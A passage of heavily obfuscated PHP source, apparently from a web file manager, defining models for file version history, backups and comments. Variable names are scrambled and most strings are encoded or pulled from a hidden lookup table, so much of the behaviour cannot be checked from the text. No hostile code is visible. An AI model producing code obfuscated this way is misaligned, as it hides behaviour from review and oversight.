$³ÊñÒáÛ[$¢½îËë§[$§€ƒ¥ß[549]][$§€ƒ¥ß[201]]]; } $¢½îËë§[$§€ƒ¥ß[100]] = $³ÊñÒáÛ[$¢½îËë§[$§€ƒ¥ß[201]]]; $¢½îËë§[$§€ƒ¥ß[2430]] = $³ÊñÒáÛ[$¢½îËë§[$§€ƒ¥ß[2414]]]; if ($¢½îËë§[$§€ƒ¥ß[43]] == $§€ƒ¥ß[1330]) { $¢½îËë§[$§€ƒ¥ß[2430]] = $¢½îËë§[$§€ƒ¥ß[100]]; $¢½îËë§[$§€ƒ¥ß[2414]] = $¢½îËë§[$§€ƒ¥ß[2430]][$§€ƒ¥ß[201]]; $¢½îËë§[$§€ƒ¥ß[100]] = !1; $¢½îËë§[$§€ƒ¥ß[201]] = $§€ƒ¥ß[12]; } $¢½îËë§[$§€ƒ¥ß[2353]] = $İ¯ÅÊë[$¢½îËë§[$§€ƒ¥ß[1588]]]; } unset($¢½îËë§); $èì™¢×†[$§€ƒ¥ß[455]] = $ßŞó„Ô§; return $èì™¢×†; } public function removeBySource($õıâÇ§±) { $ƒ‚ƒñÛ = array($_SERVER[øşô´çË][515] => $õıâÇ§±); $this->where($ƒ‚ƒñÛ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\165\x72\x63\145\x5f\x68\151\x73\x74\x6f\x72\x79"; public function historyCount($ìÌÒÊ±ú) { $²ÏøªÛ =& $_SERVER[øşô´çË]; if (!$ìÌÒÊ±ú) { return array(); } if (is_string($ìÌÒÊ±ú) || is_int($ìÌÒÊ±ú)) { $ìÌÒÊ±ú = array($ìÌÒÊ±ú); } $Ğ¸éÛ‘ = array($²ÏøªÛ[201], $²ÏøªÛ[951] => $²ÏøªÛ[594]); $îƒŠƒ³ü = array($²ÏøªÛ[201] => array($²ÏøªÛ[7], $ìÌÒÊ±ú)); $äçãıìË = $this->field($Ğ¸éÛ‘)->where($îƒŠƒ³ü)->group($²ÏøªÛ[201])->select(); return array_to_keyvalue($äçãıìË, $²ÏøªÛ[201], $²ÏøªÛ[594]); } public function addHistory($±š‡¹», $Äš´î®× = '') { $­òáœÁ =& $_SERVER[øşô´çË]; $Ó»ê­æì = array($­òáœÁ[515] => $±š‡¹»[$­òáœÁ[201]], $­òáœÁ[1964] => isset($±š‡¹»[$­òáœÁ[552]]) ? $±š‡¹»[$­òáœÁ[552]] : $±š‡¹»[$­òáœÁ[550]], $­òáœÁ[567] => $±š‡¹»[$­òáœÁ[566]], $­òáœÁ[649] => $±š‡¹»[$­òáœÁ[89]], $­òáœÁ[2431] => $Äš´î®×); if ($GLOBALS[$­òáœÁ[6]][$­òáœÁ[102]][$­òáœÁ[1403]] >= 1) { $this->historyAutoClear($Ó»ê­æì[$­òáœÁ[201]]); $this->add($Ó»ê­æì); } Hook::trigger($­òáœÁ[2432], $Ó»ê­æì); Model($­òáœÁ[2433])->eventFileEdit($±š‡¹»[$­òáœÁ[201]]); } private function historyAutoClear($Ú¶Œ†Ğ) { $Ü·ÊŸ =& $_SERVER[øşô´çË]; $Æ£Ûëô = Model($Ü·ÊŸ[875])->get($Ü·ÊŸ[963]); $ô²ı¯œĞ = intval($GLOBALS[$Ü·ÊŸ[6]][$Ü·ÊŸ[102]][$Ü·ÊŸ[1403]]); $¥Èóø€¸ = $Æ£Ûëô == $Ü·ÊŸ[964] ? min(5, $ô²ı¯œĞ) : $ô²ı¯œĞ; $¥Èóø€¸ = $¥Èóø€¸ <= 0 ? 0 : $¥Èóø€¸ - 1; if ($¥Èóø€¸ >= 499) { return; } $£ÎĞÔèá = array($Ü·ÊŸ[515] => $Ú¶Œ†Ğ); $ùö¢¡ = $this->field($Ü·ÊŸ[2434])->where($£ÎĞÔèá)->order($Ü·ÊŸ[2428])->select(); if (!$ùö¢¡ || $¥Èóø€¸ >= count($ùö¢¡)) { return; } $áıÂöËÏ = array_to_keyvalue($ùö¢¡, $Ü·ÊŸ[12], $Ü·ÊŸ[496]); $áıÂöËÏ = array_slice($áıÂöËÏ, $¥Èóø€¸); $ç¼¿š‚“ = array_to_keyvalue($ùö¢¡, $Ü·ÊŸ[12], $Ü·ÊŸ[566]); $ç¼¿š‚“ = array_slice($ç¼¿š‚“, $¥Èóø€¸); if (!$áıÂöËÏ || !$ç¼¿š‚“) { return; } $£ÎĞÔèá = array($Ü·ÊŸ[517] => array($Ü·ÊŸ[7], $áıÂöËÏ)); $this->where($£ÎĞÔèá)->delete(); Model($Ü·ÊŸ[569])->remove($ç¼¿š‚“); } public function listData($·àû•¥Ÿ) { $ ™êÁçá =& $_SERVER[øşô´çË]; $ãÃú™± = array($ ™êÁçá[515] => $·àû•¥Ÿ); $±û³…â´ = $ ™êÁçá[2435]; $æ€–î„ = $this->field($±û³…â´)->where($ãÃú™±)->order($ ™êÁçá[2428])->selectPage(); $this->_listAppendUser($æ€–î„[$ ™êÁçá[455]]); $Æ§£êñ = Model($ ™êÁçá[875])->get($ ™êÁçá[963]); $´¨Æ¨½ï = 5; if ($Æ§£êñ == $ ™êÁçá[964]) { $æ€–î„[$ ™êÁçá[455]] = array_slice($æ€–î„[$ ™êÁçá[455]], 0, $´¨Æ¨½ï); $æ€–î„[$ ™êÁçá[452]] = array($ ™êÁçá[2436] => 1, $ ™êÁçá[2437] => 20, $ ™êÁçá[2438] => 1, $ ™êÁçá[2327] => count($æ€–î„[$ ™êÁçá[455]])); } return $æ€–î„; } protected function _listAppendUser(&$‡Ëéß…›) { $§Ì¹ü =& $_SERVER[øşô´çË]; $Ğ¨æøŞ = array_to_keyvalue($‡Ëéß…›, $§Ì¹ü[12], $§Ì¹ü[1588]); $ÁùòÔÅŞ = Model($§Ì¹ü[626])->userListInfo($Ğ¨æøŞ); foreach ($‡Ëéß…› as &$’Æ®¦×¶) { $Ó¤å²åÜ = $’Æ®¦×¶[$§Ì¹ü[1588]]; $’Æ®¦×¶[$§Ì¹ü[550]] = $ÁùòÔÅŞ[$Ó¤å²åÜ] ? $ÁùòÔÅŞ[$Ó¤å²åÜ] : !1; } unset($’Æ®¦×¶); } public function fileInfo($À×ûÌï¼, $‡Ò®±ÓÀ = false) { $àìÈ¥¶ =& $_SERVER[øşô´çË]; $Ë’†¯»İ = $this->tablePrefix; $ÕŒ”Éøï = "{$Ë’†¯»İ}\x69\157\x5f\146\x69\x6c\145\x20\x66\151\154\x65\x73\40\157\x6e\40\146\x69\154\145\x73\x2e\146\151\x6c\x65\111\x44\x20\75\40\x68\x69\163\x74\157\162\x79\56\x66\151\x6c\x65\x49\104"; $¯ó˜½‘› = $this->alias($àìÈ¥¶[2439])->where(array($àìÈ¥¶[517] => $À×ûÌï¼))->join($ÕŒ”Éøï, $àìÈ¥¶[2440])->find(); if ($¯ó˜½‘› && $‡Ò®±ÓÀ) { $Ü‘­ÊÉ‚ = array($àìÈ¥¶[201] => $¯ó˜½‘›[$àìÈ¥¶[201]], $àìÈ¥¶[496] => array($àìÈ¥¶[1177], $À×ûÌï¼)); $¯ó˜½‘›[$àìÈ¥¶[1861]] = $this->where($Ü‘­ÊÉ‚)->count(); } return $¯ó˜½‘›; } public function removeItem($ÏÓÔŞêê) { $¼Ûºô±Œ =& $_SERVER[øşô´çË]; $Ùî¦Òğù = array($¼Ûºô±Œ[517] => $ÏÓÔŞêê); $õç¡í³ = $this->where($Ùî¦Òğù)->find(); if ($õç¡í³) { $óâÂ˜ÄŠ = $this->where($Ùî¦Òğù)->delete(); Model($¼Ûºô±Œ[569])->remove($õç¡í³[$¼Ûºô±Œ[566]]); return $óâÂ˜ÄŠ; } return !1; } public function removeBySource($ºØÖµİü) { $¥¸›Ôì =& $_SERVER[øşô´çË]; if (!$ºØÖµİü) { return !1; } if (!is_array($ºØÖµİü)) { $ºØÖµİü = array($ºØÖµİü); } $êÇÑìªà = array($¥¸›Ôì[515] => array($¥¸›Ôì[7], $ºØÖµİü)); $âÇÚüËÆ = $this->field($¥¸›Ôì[567])->where($êÇÑìªà)->select(); if ($âÇÚüËÆ) { $this->where($êÇÑìªà)->delete(); $Ï¦Ğ°á = array_to_keyvalue($âÇÚüËÆ, $¥¸›Ôì[12], $¥¸›Ôì[566]); Model($¥¸›Ôì[569])->remove($Ï¦Ğ°á); } return !0; } public function setDetail($¨ÖÃğí´, $ñÔ™°ÔÈ) { $ƒı¨î¿ =& $_SERVER[øşô´çË]; return $this->where(array($ƒı¨î¿[517] => $¨ÖÃğí´))->save(array($ƒı¨î¿[2431] => $ñÔ™°ÔÈ)); } public function rollbackToItem($ù¤äÛÄ, $‰Ù¡…×) { $®Éú£óİ =& $_SERVER[øşô´çË]; $´±…ô« = Model($®Éú£óİ[935])->sourceInfo($ù¤äÛÄ); $this->addHistory($´±…ô«, LNG($®Éú£óİ[2441])); $è¹ù‹ü = $this->find($‰Ù¡…×); $Üê­¸¹ = array($®Éú£óİ[566] => $è¹ù‹ü[$®Éú£óİ[566]], $®Éú£óİ[89] => $è¹ù‹ü[$®Éú£óİ[89]], $®Éú£óİ[98] => time(), $®Éú£óİ[552] => USER_ID); Model($®Éú£óİ[935])->where(array($®Éú£óİ[201] => $ù¤äÛÄ))->save($Üê­¸¹); return $this->where(array($®Éú£óİ[517] => $‰Ù¡…×))->delete(); } public function clearSame($êº“ò¯ï) { $Ñ®İĞŒ’ =& $_SERVER[øşô´çË]; $ŒÄÑôĞ´ = $this->listData($êº“ò¯ï); $­ËÅÉò£ = array_to_keyvalue_group($ŒÄÑôĞ´, $Ñ®İĞŒ’[566]); $º¬ôøÎ¦ = array(); $·Ëàş = array(); foreach ($­ËÅÉò£ as $Êı–¶–¹) { if (!$Êı–¶–¹ || count($Êı–¶–¹) <= 1) { continue; } foreach ($Êı–¶–¹ as $ö‘ƒø•É) { $º¬ôøÎ¦[] = $ö‘ƒø•É[$Ñ®İĞŒ’[566]]; $·Ëàş[] = $ö‘ƒø•É[$Ñ®İĞŒ’[496]]; } } if (!$·Ëàş) { return; } $this->where(array($Ñ®İĞŒ’[496] => array($Ñ®İĞŒ’[7], $·Ëàş)))->delete(); Model($Ñ®İĞŒ’[569])->remove($º¬ôøÎ¦); } public function userSpace() { $±ƒ—ªÅ =& $_SERVER[øşô´çË]; $ö…¹Ü¥‘ = $this->tablePrefix; $È¹Ôîûğ = array($±ƒ—ªÅ[1964] => USER_ID); $¼êÏÇÕñ = "{$ö…¹Ü¥‘}\151\157\137\146\151\x6c\145\40\x66\x69\154\x65\x73\x20\x6f\156\x20\x66\x69\x6c\x65\163\x2e\146\x69\154\x65\111\104\x20\75\x20\x68\151\x73\164\x6f\x72\x79\56\x66\151\154\x65\111\104"; return $this->alias($±ƒ—ªÅ[2439])->where($È¹Ôîûğ)->join($¼êÏÇÕñ, $±ƒ—ªÅ[2440])->sum($±ƒ—ªÅ[89]); } } goto a‹Ë»ˆ¨Ğ¥; DğÜÊÖÕ†: class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\142\x61\x63\153\165\x70\114\x69\x73\x74"; public $field = array("\x69\x6f", "\x6e\x61\x6d\x65", "\x73\x74\x61\164\165\163", "\x63\x6f\x6e\164\145\156\164", "\155\141\156\x75\x61\x6c", "\x72\x65\163\x75\154\164", "\164\151\x6d\x65\x46\x72\157\155", "\x74\151\155\x65\x54\x6f"); public $autoTask = "\141\x64\x6d\151\156\x2e\142\x61\143\x6b\x75\160\56\141\x75\164\157\x54\x61\163\x6b"; public $fileTask = "\141\144\x6d\151\156\x2e\142\141\143\x6b\165\160\56\x66\151\154\x65\x54\141\x73\153"; public function config($Ô´ìÚù© = false) { $çÙÜ¦Õô =& $_SERVER[øşô´çË]; $ƒ³‚÷š½ = $this->configSimple(); Action($çÙÜ¦Õô[2201])->taskInit($ƒ³‚÷š½); if (!$Ô´ìÚù©) { return $ƒ³‚÷š½; } $ğòî»—â = array(); if (Model($çÙÜ¦Õô[875])->get($çÙÜ¦Õô[2202], $çÙÜ¦Õô[881]) == $çÙÜ¦Õô[2203]) { Model($çÙÜ¦Õô[1942])->cacheClear(); $ğòî»—â = Model($çÙÜ¦Õô[2204])->findByKey($çÙÜ¦Õô[1559], $this->autoTask); if (!$ğòî»—â) { $ğòî»—â = array(); } if (isset($ğòî»—â[$çÙÜ¦Õô[214]])) { $ğòî»—â[$çÙÜ¦Õô[214]] = json_decode($ğòî»—â[$çÙÜ¦Õô[214]], !0); } if (isset($ƒ³‚÷š½[$çÙÜ¦Õô[214]])) { $ğòî»—â[$çÙÜ¦Õô[214]][$çÙÜ¦Õô[1946]] = $ƒ³‚÷š½[$çÙÜ¦Õô[214]]; unset($ƒ³‚÷š½[$çÙÜ¦Õô[214]]); } } $ƒ³‚÷š½ = array_merge($ğòî»—â, $ƒ³‚÷š½); if ($ƒ³‚÷š½[$çÙÜ¦Õô[178]] == $çÙÜ¦Õô[946]) { $ß•¦ÏåÊ = Model($çÙÜ¦Õô[875])->get($çÙÜ¦Õô[945], $çÙÜ¦Õô[881]); $ƒ³‚÷š½[$çÙÜ¦Õô[2205]] = json_decode($ß•¦ÏåÊ, !0); } return $ƒ³‚÷š½; } public function configSimple() { $•ŞÇçı =& $_SERVER[øşô´çË]; $Ã¹¡çé° = Model($•ŞÇçı[875])->get($•ŞÇçı[881]); $Ã¹¡çé° = json_decode($Ã¹¡çé°, !0); if (!$Ã¹¡çé°) { $Ã¹¡çé° = array($•ŞÇçı[1943] => 0); } $Ã¹¡çé°[$•ŞÇçı[1943]] = _get($Ã¹¡çé°, $•ŞÇçı[1943], 1); $this->parseContent($Ã¹¡çé°); if ($Ã¹¡çé°[$•ŞÇçı[178]] == $•ŞÇçı[946] && Model($•ŞÇçı[875])->get($•ŞÇçı[963]) == $•ŞÇçı[964]) { $Ã¹¡çé°[$•ŞÇçı[178]] = $•ŞÇçı[1304]; } return $Ã¹¡çé°; } public function listData($‰”ã¦ÆÜ = false, $ŞğÊ¯äŠ = "\155\157\x64\151\146\x79\x54\x69\x6d\145", $íÇÕğï³ = false) { $¸ ÁñâÂ = parent::listData($‰”ã¦ÆÜ, $ŞğÊ¯äŠ, !0); if (!$¸ ÁñâÂ) { return $¸ ÁñâÂ; } if ($‰”ã¦ÆÜ) { $¸ ÁñâÂ = array($¸ ÁñâÂ); } foreach ($¸ ÁñâÂ as &$ƒ†è´Ğ“) { $this->parseContent($ƒ†è´Ğ“); } return $‰”ã¦ÆÜ ? $¸ ÁñâÂ[0] : $¸ ÁñâÂ; } public function parseContent(&$ášı†ÍĞ) { $ÕèŒÏÈ =& $_SERVER[øşô´çË]; $ê¹Ë¾ı = _get($ášı†ÍĞ, $ÕèŒÏÈ[178], $ÕèŒÏÈ[101]); if (!in_array($ê¹Ë¾ı, array($ÕèŒÏÈ[946], $ÕèŒÏÈ[1304]))) { $ášı†ÍĞ[$ÕèŒÏÈ[178]] = $ê¹Ë¾ı == $ÕèŒÏÈ[101] ? $ÕèŒÏÈ[1304] : $ÕèŒÏÈ[946]; } } public function lastItem() { $Ùôü»Ñá = $this->listData(); return !empty($Ùôü»Ñá[0]) ? $Ùôü»Ñá[0] : null; } public function kill($÷¨Ğüú) { $°ä‡¹Å† =& $_SERVER[øşô´çË]; $¼—àÄûö = $this->listData($÷¨Ğüú); if (!$¼—àÄûö || empty($¼—àÄûö[$°ä‡¹Å†[42]])) { return !0; } Task::kill($°ä‡¹Å†[888]); Task::kill($°ä‡¹Å†[908]); Task::kill($°ä‡¹Å†[919]); $Ò‹üÁ”ò = $¼—àÄûö[$°ä‡¹Å†[42]]; $Ÿøá°Ü¬ = TEMP_FILES . $°ä‡¹Å†[884] . $Ò‹üÁ”ò . $°ä‡¹Å†[8]; IO::remove($Ÿøá°Ü¬, !1); return $this->remove($÷¨Ğüú); } public function remove($ãó“¤á–) { $„ìâßÎ× = $this->listData($ãó“¤á–); if (!$„ìâßÎ×) { return !0; } return $this->backupRemove($„ìâßÎ×); } private function backupRemove($Äáı•¿¶) { parent::remove($Äáı•¿¶[$_SERVER[øşô´çË][496]]); $Ã®³¿èé = $this->backupPath($Äáı•¿¶); IO::remove($Ã®³¿èé, !1); return !0; } private function backupPath($§ªùõ¼¿) { $ÍÛÅÆ»Ö =& $_SERVER[øşô´çË]; $ı‰áäèà = $§ªùõ¼¿[$ÍÛÅÆ»Ö[42]]; $ğ˜œŠŠ± = Model($ÍÛÅÆ»Ö[875])->get($ÍÛÅÆ»Ö[876]); $Ìä©ê™è = substr(md5($ÍÛÅÆ»Ö[877] . $ğ˜œŠŠ± . $ı‰áäèà), 0, 8); return "\x7b\151\x6f\72{$§ªùõ¼¿[$ÍÛÅÆ»Ö[854]]}\x7d\57\144\x61\164\x61\142\141\x73\x65\57\x62\x61\x63\153\x75\160\57" . $ı‰áäèà . $ÍÛÅÆ»Ö[11] . $Ìä©ê™è; } public function start($ì¼şÚş = "\144\142") { $É§³é» =& $_SERVER[øşô´çË]; if ($GLOBALS[$É§³é»[6]][$É§³é»[102]][$É§³é»[2206]] != $É§³é»[101]) { return !0; } $ÊµƒŒŠè = $this->configSimple(); if (!$ÊµƒŒŠè || $ÊµƒŒŠè[$É§³é»[1943]] != $É§³é»[101]) { return !1; } if ($ì¼şÚş == $É§³é»[240]) { return $this->bakFile($ÊµƒŒŠè); } $†Ş¦·× = $this->process(); foreach ($†Ş¦·× as $ƒŸ¹‹´Á) { if ($ƒŸ¹‹´Á) { return Task::restart($ƒŸ¹‹´Á[$É§³é»[496]]); } } $Ç²×”½ = new Backup(); if (!$Ç²×”½ || $Ç²×”½->message) { return !1; } $‘ïÔñ†ş = $Ç²×”½->db(); if ($‘ïÔñ†ş) { $‘ïÔñ†ş = $Ç²×”½->dbFile(); if ($‘ïÔñ†ş && $ÊµƒŒŠè[$É§³é»[178]] == $É§³é»[946]) { $‘ïÔñ†ş = $Ç²×”½->file(); } } Backup::set(array($É§³é»[852] => 1, $É§³é»[864] => time())); return !0; } public function process() { $†›¹Ç¬ø =& $_SERVER[øşô´çË]; $÷Âıúƒä = array($†›¹Ç¬ø[860] => Task::get($†›¹Ç¬ø[888]), $†›¹Ç¬ø[865] => Task::get($†›¹Ç¬ø[908]), $†›¹Ç¬ø[240] => Task::get($†›¹Ç¬ø[919])); $àéÚ÷€ = !1; foreach ($÷Âıúƒä as &$ÏÇµ©áú) { if ($àéÚ÷€) { $ÏÇµ©áú = !1; continue; } if ($ÏÇµ©áú) { $¡…ÖÌö = intval(_get($ÏÇµ©áú, $†›¹Ç¬ø[1977], 0)); if (time() - $¡…ÖÌö > 7200) { Task::kill($ÏÇµ©áú[$†›¹Ç¬ø[496]]); $àéÚ÷€ = !0; $ÏÇµ©áú = !1; } } } return $÷Âıúƒä; } public function bakFile($‡¦øÒËÇ) { $¢áğ–¯ =& $_SERVER[øşô´çË]; if ($‡¦øÒËÇ[$¢áğ–¯[178]] == $¢áğ–¯[1304]) { return !1; } Model($¢áğ–¯[1942])->cacheClear(); $®ÈÑ¾Ğ” = Model($¢áğ–¯[2204])->findByKey($¢áğ–¯[1559], $this->fileTask); if (!$®ÈÑ¾Ğ”) { return !1; } $³ÆÉ¯–  = json_decode($®ÈÑ¾Ğ”[$¢áğ–¯[214]], !0); if (!$³ÆÉ¯–  || $³ÆÉ¯– [$¢áğ–¯[43]] != $¢áğ–¯[1955]) { return !1; } $³ÆÉ¯–  = intval($³ÆÉ¯– [$¢áğ–¯[1955]]); if ($³ÆÉ¯–  <= 0) { return !1; } $ó‚‹¶µ² = new BackupFile(!0); return $ó‚‹¶µ²->start($‡¦øÒËÇ[$¢áğ–¯[854]], $³ÆÉ¯– ); } public function restore() { $şºé·®ë =& $_SERVER[øşô´çË]; ActionCall($şºé·®ë[2207], !0, 1); ActionCall($şºé·®ë[2207], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\155\x65\x6e\x74"; protected $tableMeta = array("\x74\141\x62\154\145\116\141\x6d\145" => "\143\x6f\155\x6d\x65\x6e\164\137\155\145\164\141", "\155\x65\164\141\x46\151\145\154\144" => "\x63\x6f\x6d\x6d\145\x6e\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¬¹Á¾€ã) { $åˆ×êÖ =& $_SERVER[øşô´çË]; if ($¬¹Á¾€ã[$åˆ×êÖ[2208]]) { $Ï‚•”¡ = $this->where(array($åˆ×êÖ[2209] => $¬¹Á¾€ã[$åˆ×êÖ[2208]]))->find(); if (!$Ï‚•”¡ || $Ï‚•”¡[$åˆ×êÖ[198]] != $¬¹Á¾€ã[$åˆ×êÖ[198]] || $Ï‚•”¡[$åˆ×êÖ[598]] != $¬¹Á¾€ã[$åˆ×êÖ[598]]) { return !1; } $this->where(array($åˆ×êÖ[2209] => $¬¹Á¾€ã[$åˆ×êÖ[2208]]))->setAdd($åˆ×êÖ[2210], 1); } $¬¹Á¾€ã[$åˆ×êÖ[2211]] = 0; $¬¹Á¾€ã[$åˆ×êÖ[2210]] = 0; $¬¹Á¾€ã[$åˆ×êÖ[852]] = 1; return $this->add($¬¹Á¾€ã); } public function commentCount($ÒáÅÃµ, $ˆÂ‹¸ÅÖ, $™¦âäÕ = false) { $Ş–á¤é =& $_SERVER[øşô´çË]; if (!$ÒáÅÃµ) { return array(); } if (is_string($ÒáÅÃµ) || is_int($ÒáÅÃµ)) { $ÒáÅÃµ = array($ÒáÅÃµ); } $å¶¸ËĞ¢ = array($Ş–á¤é[598], $Ş–á¤é[2212] => $Ş–á¤é[594]); $ÖúÖ§—‰ = array($Ş–á¤é[598] => array($Ş–á¤é[7], $ÒáÅÃµ), $Ş–á¤é[198] => $ˆÂ‹¸ÅÖ); if ($™¦âäÕ) { $ÖúÖ§—‰[$Ş–á¤é[1588]] = $™¦âäÕ; } $åÛŒŠá” = $this->field($å¶¸ËĞ¢)->where($ÖúÖ§—‰)->group($Ş–á¤é[598])->select(); return array_to_keyvalue($åÛŒŠá”, $Ş–á¤é[598], $Ş–á¤é[594]); } public function starTarget($«Ùğşñ, $¯â³Ü€) { $ÁªøåœŸ =& $_SERVER[øşô´çË]; $±·Æ²Íá = $«Ùğşñ + self::TYPE_STAR_OFFSET; $ÇèîÉ±Œ = array($ÁªøåœŸ[1588] => USER_ID, $ÁªøåœŸ[198] => $±·Æ²Íá, $ÁªøåœŸ[598] => $¯â³Ü€); $Œ”ÔÚƒ· = $this->where($ÇèîÉ±Œ)->find(); if ($Œ”ÔÚƒ·) { return $this->where(array($ÁªøåœŸ[496] => $Œ”ÔÚƒ·[$ÁªøåœŸ[496]]))->delete(); } $±ğ¨õ‘ = array($ÁªøåœŸ[2208] => 0, $ÁªøåœŸ[1588] => USER_ID, $ÁªøåœŸ[852] => 1, $ÁªøåœŸ[178] => $ÁªøåœŸ[12], $ÁªøåœŸ[198] => $±·Æ²Íá, $ÁªøåœŸ[598] => $¯â³Ü€, $ÁªøåœŸ[2211] => 0, $ÁªøåœŸ[2210] => 0); return $this->add($±ğ¨õ‘); } public function starTargetCount($ıã¹·ïÖ, $ñáŠ¤¦Ğ) { $ŸÏÑ’áç =& $_SERVER[øşô´çË]; $¨ó•—®Î = $ñáŠ¤¦Ğ + self::TYPE_STAR_OFFSET; $§ôÃùó‰ = $this->commentCount($ıã¹·ïÖ, $¨ó•—®Î); $‰ÕıÌ¬ = $this->commentCount($ıã¹·ïÖ, $¨ó•—®Î, USER_ID); return array($ŸÏÑ’áç[2213] => $§ôÃùó‰, $ŸÏÑ’áç[2214] => $‰ÕıÌ¬); } public function starTargetUserList($Ú‰ÁÄÇ›, $‡ûéàıñ) { $üôÌÆ…› =& $_SERVER[øşô´çË]; $Ô×ºÂè = $Ú‰ÁÄÇ› + self::TYPE_STAR_OFFSET; $Ëì“¢Õ¢ = array($üôÌÆ…›[598] => $‡ûéàıñ, $üôÌÆ…›[198] => $Ô×ºÂè); $ ÆÁ¼—Ç = $this->where($Ëì“¢Õ¢)->count(); $Î¡„ÇíÖ = array($üôÌÆ…›[341] => $ ÆÁ¼—Ç, $üôÌÆ…›[2215] => array()); if (!$ ÆÁ¼—Ç) { return $Î¡„ÇíÖ; } $“…§ŠœÕ = $this->field($üôÌÆ…›[1588])->where($Ëì“¢Õ¢)->limit(500)->select(); $“…§ŠœÕ = array_to_keyvalue($“…§ŠœÕ, $üôÌÆ…›[12], $üôÌÆ…›[1588]); $Î¡„ÇíÖ[$üôÌÆ…›[2215]] = Model($üôÌÆ…›[606])->userListInfo($“…§ŠœÕ); return $Î¡„ÇíÖ; } public function prasiseUserList($âğÌ¿è) { $¿ÓÂ²ı· =& $_SERVER[øşô´çË]; $úºıÌ±Ò = array($¿ÓÂ²ı·[2216] => $âğÌ¿è); $Ÿ–ãñ²Í = $this->where($úºıÌ±Ò)->find(); $µŞûâÈƒ = _get($Ÿ–ãñ²Í, $¿ÓÂ²ı·[2211], 0); $¢£ãşÇ‘ = array($¿ÓÂ²ı·[341] => $µŞûâÈƒ, $¿ÓÂ²ı·[2215] => array()); if (!$µŞûâÈƒ) { return $¢£ãşÇ‘; } $…ƒÅ–— = Model($¿ÓÂ²ı·[2217])->field($¿ÓÂ²ı·[1588])->where($úºıÌ±Ò)->limit(500)->select(); $…ƒÅ–— = array_to_keyvalue($…ƒÅ–—, $¿ÓÂ²ı·[12], $¿ÓÂ²ı·[1588]); $¢£ãşÇ‘[$¿ÓÂ²ı·[2215]] = Model($¿ÓÂ²ı·[606])->userListInfo($…ƒÅ–—); return $¢£ãşÇ‘; } public function remove($«ÇŠ Àì) { $Äè§–œ¥ =& $_SERVER[øşô´çË]; $†“ÌÌç¹ = array($Äè§–œ¥[2209] => $«ÇŠ Àì); $û­„±Šñ = $this->where($†“ÌÌç¹)->find(); if ($û­„±Šñ[$Äè§–œ¥[2208]]) { $this->where(array($Äè§–œ¥[2209] => $û­„±Šñ[$Äè§–œ¥[2208]]))->setAdd($Äè§–œ¥[2210], -1); } return $this->removeArray($«ÇŠ Àì); } public function edit($Ê–¾í£Å, $˜×Ü§Áî) { $ï‚ñ©­„ =& $_SERVER[øşô´çË]; $£—ÊÃ“à = array($ï‚ñ©­„[2209] => $Ê–¾í£Å); return $this->where($£—ÊÃ“à)->save(array($ï‚ñ©­„[2218] => $˜×Ü§Áî)); } public function prasise($èç²‹ï) { $«²ÚÎç‹ =& $_SERVER[øşô´çË]; $äĞ˜—§¯ = Model($«²ÚÎç‹[2219]); $Éœ¡åäÍ = array($«²ÚÎç‹[2209] => $èç²‹ï, $«²ÚÎç‹[1964] => USER_ID); $ÉëÆÃü” = $äĞ˜—§¯->where($Éœ¡åäÍ)->find(); if (!$ÉëÆÃü”) { $äĞ˜—§¯->add($Éœ¡åäÍ); $¹ş¡›†½ = $this->where(array($«²ÚÎç‹[2209] => $èç²‹ï))->setAdd($«²ÚÎç‹[2211], 1); } else { $äĞ˜—§¯->where($Éœ¡åäÍ)->delete(); $¹ş¡›†½ = $this->where(array($«²ÚÎç‹[2209] => $èç²‹ï))->setAdd($«²ÚÎç‹[2211], -1); } return $¹ş¡›†½; } public function targetInfo($²õâ£Ù¬, $Ô•›Òçâ) { $ó–…¤ï¡ =& $_SERVER[øşô´çË]; $ò¶ßè”— = array($ó–…¤ï¡[679] => $²õâ£Ù¬, $ó–…¤ï¡[680] => $Ô•›Òçâ); $áõ¥îü = $this->where($ò¶ßè”—)->count(); $”ÊÑàÚ§ = "\x52\111\x47\x48\124\40\112\117\x49\116\40{$this->tablePrefix}\x63\x6f\155\155\145\x6e\164\137\160\162\141\151\x73\145\x20\163\x74\x61\x72\40\x6f\x6e\40\143\157\155\155\145\156\x74\56\x63\x6f\155\155\x65\x6e\x74\111\104\40\75\x20\x73\x74\141\162\56\x63\x6f\x6d\155\x65\156\164\111\x44"; $âÚúÜÉ = $this->alias($ó–…¤ï¡[438])->where($ò¶ßè”—)->join($”ÊÑàÚ§, $ó–…¤ï¡[2220])->count(); $À¸˜©üù = array($ó–…¤ï¡[2221] => $áõ¥îü, $ó–…¤ï¡[2222] => $âÚúÜÉ); return $À¸˜©üù; } public function listData($Æ¼ıÇâ) { $¤ÆŠ×å =& $_SERVER[øşô´çË]; if (isset($Æ¼ıÇâ[$¤ÆŠ×å[2223]])) { if ($Æ¼ıÇâ[$¤ÆŠ×å[2223]]) { $Æ¼ıÇâ[$¤ÆŠ×å[2216]] = array($¤ÆŠ×å[1178], intval($Æ¼ıÇâ[$¤ÆŠ×å[2223]])); } unset($Æ¼ıÇâ[$¤ÆŠ×å[2223]]); } if (isset($Æ¼ıÇâ[$¤ÆŠ×å[2224]])) { if ($Æ¼ıÇâ[$¤ÆŠ×å[2224]]) { $Æ¼ıÇâ[$¤ÆŠ×å[2216]] = array($¤ÆŠ×å[1175], intval($Æ¼ıÇâ[$¤ÆŠ×å[2224]])); } unset($Æ¼ıÇâ[$¤ÆŠ×å[2224]]); } return $this->_listData($Æ¼ıÇâ); } private function _listData($ÒÂÆğ’ó) { $²¥×É =& $_SERVER[øşô´çË]; $–îàï = $this->where($ÒÂÆğ’ó)->_makeOrder()->selectPage(100); $this->_listAppendParent($–îàï[$²¥×É[455]]); $this->_listAppendUser($–îàï[$²¥×É[455]]); $this->_listAppendMeta($–îàï[$²¥×É[455]]); return $–îàï; } private function _makeOrder() { $È›ã±² =& $_SERVER[øşô´çË]; $©“¥— = array($È›ã±²[2211], $È›ã±²[2210], $È›ã±²[241]); $ÌßÎËí = Input::get($È›ã±²[553], $È›ã±²[7], $È›ã±²[521], $©“¥—); 